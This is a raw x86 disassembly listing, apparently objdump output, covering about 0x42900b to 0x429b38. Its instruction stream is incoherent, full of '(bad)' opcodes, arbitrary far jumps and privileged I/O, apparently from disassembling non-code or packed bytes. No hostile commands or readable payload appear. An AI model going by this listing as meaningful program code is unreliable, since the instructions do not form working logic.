  42900b:	sar    DWORD PTR [edx],1
  42900d:	sahf   
  42900e:	mov    ch,0xac
  429010:	ds inc edi
  429012:	xchg   edx,eax
  429013:	aad    0x2f
  429015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429016:	mov    eax,0xa51933a4
  42901b:	pop    es
  42901c:	sub    ebx,DWORD PTR es:[esi+ebp*1]
  429020:	stos   BYTE PTR es:[edi],al
  429021:	inc    esi
  429022:	rol    DWORD PTR [ecx+0x5f21f193],cl
  429028:	mov    esp,0x70e1d041
  42902d:	sbb    cl,ch
  42902f:	pop    es
  429030:	jle    0x42905c
  429032:	popf   
  429033:	lahf   
  429034:	cli    
  429035:	test   DWORD PTR [ecx+eiz*2+0x6a],edi
  429039:	sbb    cl,al
  42903b:	aad    0x5f
  42903d:	inc    ebx
  42903e:	xchg   dl,bl
  429040:	sbb    eax,0x0
	...
  4290b1:	add    BYTE PTR [eax],al
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x44b66cf7
  4290c1:	xchg   ecx,eax
  4290c2:	mov    DWORD PTR [eax+0x4f],ebp
  4290c5:	mov    bl,0x1
  4290c7:	add    ch,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [esi],bl
  4290cd:	fstp   QWORD PTR [ecx]
  4290cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290d0:	add    al,0xc2
  4290d2:	or     bl,0xd
  4290d5:	xchg   esi,eax
  4290d6:	push   eax
  4290d7:	shr    BYTE PTR [ebp+eax*4-0x3f02f86],0xc
  4290df:	ins    DWORD PTR es:[edi],dx
  4290e0:	enter  0xf6ce,0xc8
  4290e4:	imul   edi,DWORD PTR [ebx+0x3b],0xfc70d8e0
  4290eb:	xor    DWORD PTR [ebp-0x31],ebx
  4290ee:	jns    0x4290ce
  4290f0:	inc    edx
  4290f1:	pop    ebx
  4290f2:	mov    bh,0x52
  4290f4:	loop   0x429116
  4290f6:	cmc    
  4290f7:	fadd   st(5),st
  4290f9:	call   0x36a9:0xe94b15b8
  429100:	test   eax,0xb1a03b9
  429105:	push   esi
  429106:	xor    BYTE PTR [ebx],dh
  429108:	not    BYTE PTR [edi]
  42910a:	(bad)  
  42910b:	outs   dx,DWORD PTR ds:[esi]
  42910c:	push   ebx
  42910d:	leave  
  42910e:	sti    
  42910f:	jbe    0x4290ed
  429111:	ret    0x856b
  429114:	jns    0x429100
  429116:	arpl   WORD PTR [ebp+0x74],si
  429119:	sub    ebx,edi
  42911b:	imul   edi,DWORD PTR [esp+edx*1],0xc50ef2ec
  429122:	jmp    0x4a2d:0x8b68c1c2
  429129:	cmp    al,dh
  42912b:	popa   
  42912c:	and    DWORD PTR [ebx-0x7d],edx
  42912f:	sbb    esi,DWORD PTR [ecx]
  429131:	push   esp
  429132:	xchg   DWORD PTR [edi-0x43cba704],ebx
  429138:	mov    ebx,0xc4d94302
  42913d:	jae    0x4290c1
  42913f:	mov    cl,0xb6
  429141:	jbe    0x42914d
  429143:	shr    BYTE PTR [esi+0x1335d35e],0x6e
  42914a:	jnp    0x42913b
  42914c:	adc    esi,DWORD PTR [esp+eax*4-0x6bdab323]
  429153:	and    al,0xcb
  429155:	jmp    0x604e:0xaa0fa8a3
  42915c:	cmp    al,0xc1
  42915e:	std    
  42915f:	fwait
  429160:	xor    DWORD PTR [ebx-0x47b36e5],ecx
  429166:	and    ecx,DWORD PTR [ebx-0x3d]
  429169:	and    al,0x80
  42916b:	aas    
  42916c:	jge    0x429132
  42916e:	mov    bh,BYTE PTR [edx]
  429170:	push   ebp
  429171:	cmp    eax,0x9a4756ff
  429176:	dec    ecx
  429177:	add    edx,eax
  429179:	pop    ds
  42917a:	addr16 sbb al,0x6a
  42917d:	and    eax,0x1c46a7c0
  429182:	sbb    BYTE PTR [esi],dl
  429184:	sub    BYTE PTR [ebp+edi*8+0x487d227d],dh
  42918b:	jo     0x4291ee
  42918d:	repz push edx
  42918f:	iret   
  429190:	mov    ds,eax
  429192:	mov    ch,0xc
  429194:	mov    WORD PTR [edi-0x381d61e8],ds
  42919a:	in     eax,dx
  42919b:	sbb    edx,DWORD PTR [ecx-0x25]
  42919e:	fdivr  st,st(5)
  4291a0:	mov    dh,0xcd
  4291a2:	fbld   TBYTE PTR [edx+eiz*2+0x7e]
  4291a6:	push   ds
  4291a7:	jmp    FWORD PTR [edx+eax*1+0xf]
  4291ab:	sub    BYTE PTR [ecx-0x5],0x29
  4291af:	inc    esp
  4291b0:	or     ch,BYTE PTR [ecx-0x32948cdb]
  4291b6:	pop    ecx
  4291b7:	push   edi
  4291b8:	jmp    0xbe8d321f
  4291bd:	test   DWORD PTR [edi+0x6214],eax
	...
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	pop    ss
  429241:	cwde   
  429242:	or     eax,0x1b444ea
  429247:	add    ch,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [ebx+ebx*4-0x6],bh
  42924f:	jbe    0x429266
  429251:	push   edx
  429252:	jb     0x42925b
  429254:	retf   0xd4ed
  429257:	cmp    eax,0x5a1b263e
  42925c:	mov    bh,0xc2
  42925e:	js     0x4291fa
  429260:	popf   
  429261:	mov    ds:0x857c74a,al
  429266:	mov    ds:0xb8b8c746,al
  42926b:	and    DWORD PTR [eax],esp
  42926d:	dec    edx
  42926e:	retf   0x8dd
  429271:	jmp    0x4a9c30c3
  429276:	cmp    eax,0x2063d90b
  42927b:	rol    DWORD PTR [esi+eiz*1-0x2e],cl
  42927f:	mov    edi,DWORD PTR [edx+ebx*2-0x1d]
  429283:	cli    
  429284:	data16 jne 0x4292c5
  429287:	icebp  
  429288:	xchg   BYTE PTR [ecx],cl
  42928a:	cli    
  42928b:	sub    ebp,DWORD PTR [eax-0x2a]
  42928e:	mov    eax,ds:0xc4a699db
  429293:	retf   0xcb38
  429296:	pop    esi
  429297:	xor    esp,DWORD PTR [edx+0x5f]
  42929a:	push   ss
  42929b:	aaa    
  42929c:	ret    
  42929d:	in     eax,dx
  42929e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42929f:	or     DWORD PTR [ebp-0x2c56c746],eax
  4292a5:	add    DWORD PTR [ecx-0x63],ebp
  4292a8:	mov    ch,0x1a
  4292aa:	cmp    dh,BYTE PTR [eax]
  4292ac:	xor    al,0x17
  4292ae:	(bad)  
  4292af:	ja     0x42931f
  4292b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292b2:	mov    dh,0xe7
  4292b4:	mov    al,ds:0x51cda4be
  4292b9:	add    eax,0x226b6207
  4292be:	jle    0x429329
  4292c0:	xor    eax,0xdf81c573
  4292c5:	ror    BYTE PTR [edi-0x39],0x53
  4292c9:	div    BYTE PTR [edi-0x3b]
  4292cc:	dec    ebp
  4292cd:	and    al,0x6c
  4292cf:	shl    DWORD PTR [ebx-0x5df40f52],1
  4292d5:	jns    0x4292cf
  4292d7:	fstp   TBYTE PTR [ebp-0x4f1971dc]
  4292dd:	mov    ebx,0x2c0559f8
  4292e2:	xchg   ebp,eax
  4292e3:	ins    DWORD PTR es:[edi],dx
  4292e4:	fs aam 0x93
  4292e7:	js     0x4292f6
  4292e9:	jmp    0x4292bd
  4292eb:	ss test al,0x5c
  4292ee:	stos   BYTE PTR es:[edi],al
  4292ef:	fcmovnu st,st(6)
  4292f1:	dec    ecx
  4292f2:	call   0x871:0x4e81cf6
  4292f9:	loop   0x42928c
  4292fb:	mov    ah,0x1d
  4292fd:	cmc    
  4292fe:	sub    edi,ecx
  429300:	sar    eax,0x37
  429303:	dec    esi
  429304:	adc    edx,DWORD PTR [ebx+0x28b44914]
  42930a:	rcr    dl,0x54
  42930d:	and    al,0x4b
  42930f:	dec    edx
  429310:	pop    esi
  429311:	(bad)  
  429312:	xor    al,0x72
  429314:	repnz adc BYTE PTR [edi-0x22],cl
  429318:	test   eax,0xfc37ba32
  42931d:	mov    bh,0xdd
  42931f:	pop    ebx
  429320:	dec    ebx
  429321:	(bad)  
  429322:	jle    0x429386
  429324:	cmp    ah,ah
  429326:	ret    
  429327:	inc    esi
  429328:	leave  
  429329:	pop    ds
  42932a:	je     0x429349
  42932c:	sete   BYTE PTR [edi]
  42932f:	sub    dh,BYTE PTR [esp+esi*4]
  429332:	sub    ecx,DWORD PTR [eax-0x3d]
  429335:	idiv   BYTE PTR [ebp-0x34]
  429338:	inc    ebx
  429339:	mov    bl,dh
  42933b:	cwde   
  42933c:	mov    edi,0xe7e12ce5
	...
  4293b1:	add    BYTE PTR [eax],al
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	mov    ebp,0x39558b63
  4293c5:	mov    ch,0x1
  4293c7:	add    ch,dh
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    BYTE PTR [ebp-0x7f535242],bl
  4293d1:	or     ecx,DWORD PTR [ecx]
  4293d3:	cmp    DWORD PTR ds:0x638e078,ebx
  4293d9:	push   ebx
  4293da:	mov    ecx,0x938a0a5d
  4293df:	pop    es
  4293e0:	arpl   WORD PTR gs:[esi+esi*4-0x1],cx
  4293e5:	adc    al,0x5a
  4293e7:	(bad)  [ecx]
  4293e9:	cmp    dh,BYTE PTR [eax+0x2f1c1c7f]
  4293ef:	add    cl,BYTE PTR [ecx-0x1ba9bfd7]
  4293f5:	sub    al,0x51
  4293f7:	stos   BYTE PTR es:[edi],al
  4293f8:	test   eax,0x2423be80
  4293fd:	push   ebp
  4293fe:	pop    ds
  4293ff:	shl    DWORD PTR [ecx+0x62],cl
  429402:	jl     0x4293e3
  429404:	pop    ebx
  429405:	mov    ecx,0x6c60065a
  42940a:	xor    eax,0x7bf144d5
  42940f:	cs cmp eax,0xa24bd455
  429415:	xor    DWORD PTR [ecx-0x48],0x83cf4597
  42941c:	(bad)  
  42941d:	dec    eax
  42941e:	jg     0x4293b3
  429420:	mov    dh,0x52
  429422:	repz scas eax,DWORD PTR es:[edi]
  429424:	adc    DWORD PTR [edx-0x27],esi
  429427:	sar    DWORD PTR [edi],1
  429429:	inc    ebx
  42942a:	es jbe 0x429474
  42942d:	into   
  42942e:	in     eax,dx
  42942f:	mov    eax,ds:0xbf4513b4
  429434:	cdq    
  429435:	test   DWORD PTR [edi],ecx
  429437:	xchg   esi,eax
  429438:	adc    dh,BYTE PTR [eax]
  42943a:	leave  
  42943b:	cdq    
  42943c:	cmp    ebx,esp
  42943e:	popa   
  42943f:	push   0x10b27ba2
  429444:	das    
  429445:	popa   
  429446:	sbb    esi,DWORD PTR [esi-0x154886e1]
  42944c:	xor    eax,0x845c9c01
  429451:	jle    0x4293d6
  429453:	add    edi,DWORD PTR [ebp-0x2e]
  429456:	add    dl,bl
  429458:	sub    eax,0x1bf4e068
  42945d:	push   ds
  42945e:	add    al,0xd5
  429460:	test   edi,esp
  429462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429463:	fs sub al,0x45
  429466:	test   eax,0xd5a5f97
  42946b:	push   es
  42946c:	or     al,0x1b
  42946e:	nop
  42946f:	inc    eax
  429470:	sbb    edi,DWORD PTR [eax+0x4ea4d4c9]
  429476:	sub    BYTE PTR [esi+0x3d],dl
  429479:	mov    bh,0x79
  42947b:	pop    esi
  42947c:	js     0x429445
  42947e:	ret    
  42947f:	pop    edi
  429480:	pop    edx
  429481:	jmp    0x429483
  429483:	scas   eax,DWORD PTR es:[edi]
  429484:	mov    eax,0xb8d5f7c6
  429489:	dec    esi
  42948a:	mov    al,ds:0x6d1cfc71
  42948f:	(bad)  
  429490:	pop    ds
  429491:	je     0x429427
  429493:	ins    DWORD PTR es:[edi],dx
  429494:	push   eax
  429495:	mov    BYTE PTR [edi+eax*8],dl
  429498:	das    
  429499:	out    dx,al
  42949a:	push   ebp
  42949b:	das    
  42949c:	call   0x1a03e8b0
  4294a1:	test   BYTE PTR ds:0x8bcd1b14,0xa5
  4294a8:	xchg   DWORD PTR [ebx-0x4d],esi
  4294ab:	fstp   TBYTE PTR [esi]
  4294ad:	aam    0x81
  4294af:	push   eax
  4294b0:	popa   
  4294b1:	mov    ah,0x42
  4294b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294b4:	cmp    BYTE PTR [ebp+0x60],al
  4294b7:	push   esp
  4294b8:	aam    0x33
  4294ba:	loopne 0x429480
  4294bc:	mov    ebx,0xec8b3b04
	...
  429531:	add    BYTE PTR [eax],al
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x89b1c4f3
  429542:	cmc    
  429543:	cwde   
  429544:	cs mov dh,0x1
  429547:	add    ch,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [esi+eax*8+0x2d],bl
  42954f:	or     edx,0xffffffef
  429552:	sub    DWORD PTR [edx-0x70],0xf3cb2501
  429559:	pop    es
  42955a:	jae    0x429553
  42955c:	adc    dh,bh
  42955e:	je     0x42955d
  429560:	test   eax,0x3453eb87
  429565:	jl     0x42951e
  429567:	ficomp DWORD PTR [esp+ebx*8+0x64]
  42956b:	cmp    ebp,edi
  42956d:	mov    ?,WORD PTR [edi+0x71]
  429570:	imul   ebx,DWORD PTR [eax],0xffffffeb
  429573:	aam    0x22
  429575:	mov    dl,bh
  429577:	mov    ds:0xc0ca826e,al
  42957c:	and    al,al
  42957e:	mov    al,0x45
  429580:	fcomp  DWORD PTR [edi+0x51]
  429583:	cwde   
  429584:	outs   dx,BYTE PTR ds:[esi]
  429585:	cmp    DWORD PTR [ecx],esp
  429587:	and    DWORD PTR [esi+esi*1-0xf],esp
  42958b:	dec    esp
  42958c:	xchg   ebp,ebx
  42958e:	aad    0x3e
  429590:	cld    
  429591:	in     al,dx
  429592:	fwait
  429593:	dec    esi
  429594:	mov    ds:0xbdcaf3df,al
  429599:	mov    dh,0x64
  42959b:	and    eax,0x7edfbe2a
  4295a0:	sub    BYTE PTR [edi],dl
  4295a2:	xchg   ah,al
  4295a4:	scas   eax,DWORD PTR es:[edi]
  4295a5:	mov    cl,0x34
  4295a7:	(bad)  
  4295a8:	mov    ch,0x8d
  4295aa:	push   ecx
  4295ab:	je     0x42954d
  4295ad:	xor    BYTE PTR [edi-0x36b6b265],dl
  4295b3:	iret   
  4295b4:	xor    BYTE PTR [ebx+0x68],dl
  4295b7:	lods   eax,DWORD PTR ds:[esi]
  4295b8:	and    ch,BYTE PTR [edx+0x68]
  4295bb:	fild   DWORD PTR [esp+eax*2-0x6e]
  4295bf:	lahf   
  4295c0:	mov    ds:0x71a199b5,eax
  4295c5:	xlat   BYTE PTR ds:[ebx]
  4295c6:	imul   ecx,DWORD PTR [ebx],0x4c
  4295c9:	idiv   bl
  4295cb:	add    BYTE PTR [ebx],dl
  4295cd:	fisubr WORD PTR [ebx+0x56]
  4295d0:	(bad)  
  4295d1:	xor    BYTE PTR [esi-0x73],0x74
  4295d5:	loop   0x42958a
  4295d7:	add    al,0x1a
  4295d9:	and    ecx,ebx
  4295db:	sub    ecx,esp
  4295dd:	push   edi
  4295de:	cld    
  4295df:	sub    al,0x6f
  4295e1:	std    
  4295e2:	int3   
  4295e3:	pop    ss
  4295e4:	or     DWORD PTR [ecx],ebx
  4295e6:	stos   BYTE PTR es:[edi],al
  4295e7:	(bad)  
  4295e8:	xchg   ecx,eax
  4295e9:	xlat   BYTE PTR ds:[ebx]
  4295ea:	cmp    al,0x48
  4295ec:	push   0xffffffe3
  4295ee:	jbe    0x4295ee
  4295f0:	mov    dh,0x64
  4295f2:	push   cs
  4295f3:	pop    esp
  4295f4:	push   ss
  4295f5:	xchg   ebx,eax
  4295f6:	dec    edx
  4295f7:	retf   0xf5fb
  4295fa:	mov    esp,0xb8a51dba
  4295ff:	loopne 0x429644
  429601:	in     al,0x4b
  429603:	jb     0x429660
  429605:	sub    eax,0x48bed340
  42960a:	and    DWORD PTR ds:0x8ffd83ca,0xffffffa5
  429611:	in     eax,dx
  429612:	add    cl,BYTE PTR [edx+0x1abaef26]
  429618:	xor    eax,0x9a748430
  42961d:	xchg   esp,eax
  42961e:	xlat   BYTE PTR ds:[ebx]
  42961f:	add    al,0x85
  429621:	sub    DWORD PTR [edi],0x92f0982e
  429627:	popf   
  429628:	jns    0x429601
  42962a:	push   ebx
  42962b:	sbb    al,0x2a
  42962d:	xchg   ecx,eax
  42962e:	push   es
  42962f:	ja     0x42964a
  429631:	mov    edx,0xfe49f4aa
  429636:	out    dx,al
  429637:	pop    edx
  429638:	lods   al,BYTE PTR ds:[esi]
  429639:	mov    ch,0x43
  42963b:	sub    dl,BYTE PTR [edx-0x51]
  42963e:	pop    edi
  42963f:	leave  
  429640:	add    BYTE PTR ss:[eax],al
	...
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	sub    BYTE PTR [eax-0x48dc3642],0x1
  4296c7:	add    ch,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    bl,al
  4296cd:	data16 xchg BYTE PTR ds:0x26f8f5ec,bl
  4296d4:	(bad)  
  4296d6:	(bad)  
  4296d7:	fisub  WORD PTR [ebp-0x6]
  4296da:	fstp   st(7)
  4296dc:	test   DWORD PTR [edi+0x3f],eax
  4296df:	retf   0x6d9d
  4296e2:	outs   dx,BYTE PTR ds:[esi]
  4296e3:	fwait
  4296e4:	aad    0x97
  4296e6:	ds inc edi
  4296e8:	sar    BYTE PTR [ecx+ebx*4+0x7a],1
  4296ec:	or     dl,dh
  4296ee:	and    ch,BYTE PTR [ecx]
  4296f0:	ficomp WORD PTR [esi+edx*8+0x4c71839b]
  4296f7:	arpl   WORD PTR [ebx+0x56],di
  4296fa:	dec    edx
  4296fb:	mov    ?,esp
  4296fd:	xlat   BYTE PTR ds:[ebx]
  4296fe:	cmp    eax,0xb304a797
  429703:	or     BYTE PTR [ebx-0x3f],bh
  429706:	fcmovnbe st,st(7)
  429708:	leave  
  429709:	jmp    0xf6bb6899
  42970e:	in     al,dx
  42970f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429710:	jg     0x42971d
  429712:	jmp    0x4296d2
  429714:	into   
  429715:	inc    ebp
  429716:	repz aad 0x86
  429719:	fiadd  WORD PTR [edi-0x5f]
  42971c:	adc    esi,edi
  42971e:	mov    DWORD PTR [edx+0x32],edi
  429721:	sar    esp,0x64
  429724:	call   0x3863:0xfedc3693
  42972b:	(bad)  
  42972c:	xchg   edi,eax
  42972d:	retf   
  42972e:	jnp    0x42979f
  429730:	aam    0xea
  429732:	xchg   edx,eax
  429733:	jnp    0x4297a9
  429735:	(bad)  
  429736:	aaa    
  429737:	test   eax,0x192fe03d
  42973c:	sahf   
  42973d:	daa    
  42973e:	mov    edx,0x8f8d049
  429743:	push   0xf4c686a9
  429748:	inc    edi
  429749:	mov    bl,0xc5
  42974b:	lahf   
  42974c:	sbb    ebx,ebp
  42974e:	sar    BYTE PTR [ebx+ecx*4],1
  429751:	xchg   DWORD PTR [ebx-0x34175fc8],esp
  429757:	out    dx,eax
  429758:	push   ebx
  429759:	ret    
  42975a:	sub    eax,0xf55c4a9d
  42975f:	dec    ebx
  429760:	pop    edx
  429761:	nop
  429762:	xor    BYTE PTR [ecx-0x4c],al
  429765:	xchg   esp,eax
  429766:	imul   edx,DWORD PTR [edi+ebx*8],0xffffff9b
  42976a:	sub    ah,BYTE PTR [esi+0xe]
  42976d:	and    edi,ebp
  42976f:	enter  0x540c,0x96
  429773:	outs   dx,BYTE PTR ds:[esi]
  429774:	test   DWORD PTR [eax],edi
  429776:	repz imul edi,ecx,0xffffffd8
  42977a:	(bad)  
  42977b:	cmp    eax,0x11208308
  429780:	ds scas eax,DWORD PTR es:[edi]
  429782:	outs   dx,BYTE PTR ds:[esi]
  429783:	push   ecx
  429784:	leave  
  429785:	retf   
  429786:	lods   al,BYTE PTR ds:[esi]
  429787:	inc    edi
  429788:	pop    ss
  429789:	mov    ds:0xe5877e52,al
  42978e:	ret    0xe4ff
  429791:	mov    ebx,0x9e0eb838
  429796:	or     eax,0x203ea2ab
  42979b:	in     eax,dx
  42979c:	aaa    
  42979d:	cld    
  42979e:	into   
  42979f:	push   ss
  4297a0:	mov    ebp,0x155083fb
  4297a5:	or     bh,BYTE PTR [eax-0x1c3e17d5]
  4297ab:	lock rcl bh,cl
  4297ae:	push   ecx
  4297af:	jmp    0x42978a
  4297b1:	das    
  4297b2:	ins    DWORD PTR es:[edi],dx
  4297b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297b4:	jmp    0x6da4:0x92e21538
  4297bb:	std    
  4297bc:	push   ds
  4297bd:	push   esi
  4297be:	jecxz  0x4297dc
  4297c0:	outs   dx,DWORD PTR ds:[esi]
	...
  429831:	add    BYTE PTR [eax],al
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [esi+0x29],edi
  429842:	test   DWORD PTR [eax+ebx*1-0xafffe48],0x85000000
  42984d:	sbb    ecx,DWORD PTR [ebx+esi*2+0x416d04f9]
  429854:	rcl    esp,0x4b
  429857:	sti    
  429858:	es or  al,0xa9
  42985b:	popa   
  42985c:	scas   al,BYTE PTR es:[edi]
  42985d:	nop
  42985e:	fwait
  42985f:	adc    DWORD PTR [edi-0x5ff3d45],ecx
  429865:	mov    ah,0xd3
  429867:	sub    esp,ebp
  429869:	in     al,0xa5
  42986b:	jmp    0x76fc:0xe468c11c
  429872:	mov    esi,0xf0da2321
  429877:	cli    
  429878:	dec    edi
  429879:	mov    DWORD PTR [eax],edi
  42987b:	fist   WORD PTR [edx+edi*2]
  42987e:	pop    ss
  42987f:	pop    ss
  429880:	test   BYTE PTR [edx+eiz*4-0x18348a8d],ah
  429887:	fsubrp st(5),st
  429889:	rcl    BYTE PTR [eax-0x32],1
  42988c:	cli    
  42988d:	cdq    
  42988e:	jecxz  0x4298b4
  429890:	or     cl,cl
  429892:	xor    al,0x50
  429894:	mov    ebp,0xb7411599
  429899:	push   0x67
  42989b:	arpl   WORD PTR [esi],dx
  42989d:	loope  0x4298ec
  42989f:	pop    edx
  4298a0:	cmp    dl,ch
  4298a2:	shr    DWORD PTR [esi],1
  4298a4:	neg    DWORD PTR [eax]
  4298a6:	(bad)  
  4298a8:	iret   
  4298a9:	bound  edi,QWORD PTR [ebx]
  4298ab:	mov    dl,BYTE PTR ds:0xd0ce3afc
  4298b1:	push   ds
  4298b2:	imul   ebx,DWORD PTR [esi+0x5b9cc24],0x69c86c50
  4298bc:	sub    BYTE PTR [edx-0x31e154a1],cl
  4298c2:	hlt    
  4298c3:	das    
  4298c4:	or     dh,bh
  4298c6:	or     DWORD PTR [esi+0x6a],esp
  4298c9:	push   ebp
  4298ca:	inc    esi
  4298cb:	mov    esi,DWORD PTR [edi+0x52]
  4298ce:	mov    al,ds:0x9719113
  4298d3:	pop    ebx
  4298d4:	jno    0x429866
  4298d6:	dec    eax
  4298d7:	sti    
  4298d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298d9:	imul   edi,DWORD PTR [eax+0x1c346e4e],0xbf073235
  4298e3:	jae    0x4298ac
  4298e5:	sbb    BYTE PTR [edx+0xd],cl
  4298e8:	sbb    al,0xdf
  4298ea:	fcomp  DWORD PTR [eax]
  4298ec:	cmc    
  4298ed:	js     0x42989b
  4298ef:	gs jmp 0x7075c64e
  4298f5:	jnp    0x429919
  4298f7:	inc    edx
  4298f8:	out    0x1e,eax
  4298fa:	hlt    
  4298fb:	dec    ecx
  4298fc:	scas   eax,DWORD PTR es:[edi]
  4298fd:	pushf  
  4298fe:	push   0x9bd4e4af
  429903:	mov    al,ds:0xb7aea245
  429908:	push   ds
  429909:	lods   eax,DWORD PTR ds:[esi]
  42990a:	xchg   esi,eax
  42990b:	(bad)
  42990e:	aas    
  42990f:	xchg   bl,ah
  429911:	bound  ebx,QWORD PTR [ecx]
  429913:	aad    0xed
  429915:	mov    ah,0x79
  429917:	mov    eax,0xe9b0e0b1
  42991c:	inc    ebp
  42991d:	shl    dh,0x56
  429920:	mov    al,0xe6
  429922:	dec    BYTE PTR [esi-0x80]
  429925:	loopne 0x4298d2
  429927:	cwde   
  429928:	push   esp
  429929:	ss push ss
  42992b:	mov    al,0x41
  42992d:	mov    al,0x5a
  42992f:	loop   0x429993
  429931:	(bad)  
  429932:	ins    BYTE PTR es:[edi],dx
  429933:	ds and ebp,ecx
  429936:	test   al,0x37
  429938:	enter  0xe94c,0x6
  42993c:	mov    ah,0x66
  42993e:	and    BYTE PTR [eax+0x37],al
	...
  4299b4:	dec    ebp
  4299b5:	or     al,0xf8
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    esp,edx
  4299c1:	scas   eax,DWORD PTR es:[edi]
  4299c2:	sub    al,0x78
  4299c4:	or     eax,0xf50001b9
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [edi],dh
  4299cd:	shl    BYTE PTR [edx-0x7922a8f],0xbf
  4299d4:	cmc    
  4299d5:	sbb    bh,BYTE PTR [eax-0x78]
  4299d8:	ja     0x429972
  4299da:	sbb    DWORD PTR [edx],esp
  4299dc:	jl     0x429a42
  4299de:	add    ebp,0xfffffffa
  4299e1:	xchg   edx,eax
  4299e2:	aaa    
  4299e3:	mov    ds:0x4bdc684b,eax
  4299e8:	ins    BYTE PTR es:[edi],dx
  4299e9:	sub    eax,0xfcf09c89
  4299ee:	or     ecx,DWORD PTR [eax-0xa]
  4299f1:	les    edi,FWORD PTR [esi+0x1]
  4299f4:	ja     0x429a46
  4299f6:	(bad)  
  4299f7:	push   ds
  4299f8:	std    
  4299f9:	jae    0x4299d6
  4299fb:	mov    eax,ds:0xb7fc12bb
  429a00:	loopne 0x4299d7
  429a02:	sbb    dl,BYTE PTR [esi-0x3bdd908d]
  429a08:	sti    
  429a09:	lea    edi,[edi]
  429a0b:	mov    ss,WORD PTR [ebx-0x53d5eec6]
  429a11:	aam    0x68
  429a13:	sahf   
  429a14:	fadd   DWORD PTR [edi+0x24]
  429a17:	adc    eax,0x1778a52b
  429a1c:	inc    dl
  429a1e:	sbb    al,0x62
  429a20:	test   DWORD PTR [ecx+0x68c2f12],ebp
  429a26:	aad    0x18
  429a28:	mov    ebp,0x2173c488
  429a2d:	xchg   BYTE PTR [edi+0x6d],ch
  429a30:	xchg   ebx,eax
  429a31:	add    BYTE PTR [eax-0x486a09f6],bl
  429a37:	mov    cl,0x31
  429a39:	test   eax,0xa754a3e2
  429a3e:	inc    ecx
  429a3f:	cmova  esi,DWORD PTR [ecx]
  429a42:	pop    ebp
  429a43:	push   ds
  429a44:	dec    esi
  429a45:	fstp   DWORD PTR [ebp-0x4f]
  429a48:	bound  eax,QWORD PTR [eax-0x241c4f7c]
  429a4e:	xchg   esi,eax
  429a4f:	lock lock ret 
  429a52:	pop    ebp
  429a53:	dec    ebp
  429a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a55:	es retf 0x941d
  429a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a5a:	sub    cl,BYTE PTR [edx+0x41fefb92]
  429a60:	loop   0x429a41
  429a62:	dec    edx
  429a63:	jbe    0x429a7e
  429a65:	minps  xmm6,xmm2
  429a68:	jg     0x429a27
  429a6a:	rol    DWORD PTR ds:[eax+0xc3ea3b2],cl
  429a71:	push   esi
  429a72:	scas   eax,DWORD PTR es:[edi]
  429a73:	jae    0x429aef
  429a75:	inc    ecx
  429a76:	inc    ecx
  429a77:	dec    eax
  429a78:	popa   
  429a79:	ins    DWORD PTR es:[edi],dx
  429a7a:	push   esi
  429a7b:	xor    BYTE PTR [ecx],ch
  429a7d:	inc    eax
  429a7e:	mov    ebp,0x51c24387
  429a83:	jl     0x429a55
  429a85:	xchg   ebp,eax
  429a86:	sub    eax,0x3f462b31
  429a8b:	lds    edi,FWORD PTR ds:0x31868eb0
  429a91:	int3   
  429a92:	xchg   ebx,eax
  429a93:	mov    al,ds:0x9a231177
  429a98:	cmp    ch,BYTE PTR [esi-0x64372b35]
  429a9e:	mov    DWORD PTR [esi-0x4d],ebp
  429aa1:	out    dx,eax
  429aa2:	aaa    
  429aa3:	inc    edx
  429aa4:	je     0x429b1e
  429aa6:	imul   eax,DWORD PTR ds:0x99fd5fec,0x2ac2d6b4
  429ab0:	lds    ecx,FWORD PTR [edi-0x5d47c217]
  429ab6:	pop    esp
  429ab7:	or     BYTE PTR [esi-0x40d44e47],bh
  429abd:	push   es
  429abe:	xlat   BYTE PTR ds:[ebx]
  429abf:	lods   al,BYTE PTR ds:[esi]
  429ac0:	nop
	...
  429b31:	add    BYTE PTR [eax],al
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
